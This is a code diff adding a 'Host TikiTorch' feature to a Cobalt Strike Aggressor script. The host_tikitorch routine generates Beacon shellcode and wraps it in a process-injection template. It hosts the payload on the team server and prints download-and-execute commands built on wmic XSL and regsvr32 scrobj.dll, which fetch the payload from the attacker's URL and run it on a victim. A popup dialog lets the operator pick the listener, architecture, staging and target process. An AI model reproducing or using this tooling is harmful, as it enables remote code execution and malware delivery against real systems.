@@ -305,6 +305,66 @@ alias tikispawnas {
 
 }
 
+sub host_tikitorch {
+
+	%options = $3;
+
+	$uri = $3["uri"];
+	$host = $3["host"];
+	$port = $3["port"];
+	$listener = $3["listener"];
+	$arch = $3["arch"];
+	$stage = $3["stage"];
+	$process = $3["process"];
+	$format = $3["format"];
+
+	########################
+	### Generate Payload ###
+	########################
+
+	if ($stage eq "stageless") {
+
+		artifact_stageless($listener, "raw", $arch, "", $this);
+		yield;
+		$payload = base64_encode($1);
+
+	} else {
+
+		$payload = shellcode($listener, false, $arch);
+
+	}
+
+
+	#####################
+	### Grab Template ###
+	#####################
+
+	$template = get_template($arch, $format);
+
+	################
+	### Data Sub ###
+	################
+
+	$final = data_sub($process, $payload, $format, $template);
+
+	####################
+	### Host Payload ###
+	####################
+
+	if ($format eq "xsl") {
+		$uri = $uri . ".xsl"
+	}
+
+	$url = site_host($host, $port, $uri, $final, "text/plain", "TikiTorch", false);
+
+	if ($format eq "xsl"){
+		prompt_text("Command: ", "wmic os get /format:\" $+ $url $+ \"", {});
+	} else if ($format eq "sct"){
+		prompt_text("Command: ", "regsvr32 /s /n /u /i:\" $+ $url $+ \" scrobj.dll", {});
+	}
+	
+}
+
 beacon_command_register (
 
 	"tikispawn", 
@@ -323,3 +383,31 @@ beacon_command_register (
 	"Beacon will try to authenticate as a local user."
 
 );
+
+popup attacks {
+	
+	item "Host TikiTorch" {
+
+		local('$dialog %defaults');
+
+		%defaults["uri"] = "/TikiTorch";
+		%defaults["host"] = localip();
+		%defaults["port"] = 80;
+		%defaults["stage"] = "true";
+		%defaults["process"] = "C:\\\\Windows\\\\System32\\\\calc.exe";
+
+		$dialog = dialog("TikiTorch", %defaults, &host_tikitorch);
+		dialog_description($dialog, "Host a TikiTorch Payload on the CS Team Server.");
+		drow_text($dialog, "uri", "URI Path: ");
+		drow_text($dialog, "host", "Local Host: ");
+		drow_text($dialog, "port", "Local Port: ");
+		drow_listener_stage($dialog, "listener", "Listener: ")
+		drow_combobox($dialog, "arch", "Architecture: ", @("x64", "x86"));
+		drow_combobox($dialog, "stage", "Stage: ", @("stageless", "staged"));
+		drow_text($dialog, "process", "Target Process Path: ");
+		drow_combobox($dialog, "format", "Format: ", @("xsl", "sct"));
+		dbutton_action($dialog, "Go");
+		dialog_show($dialog);
+	}
+
+}
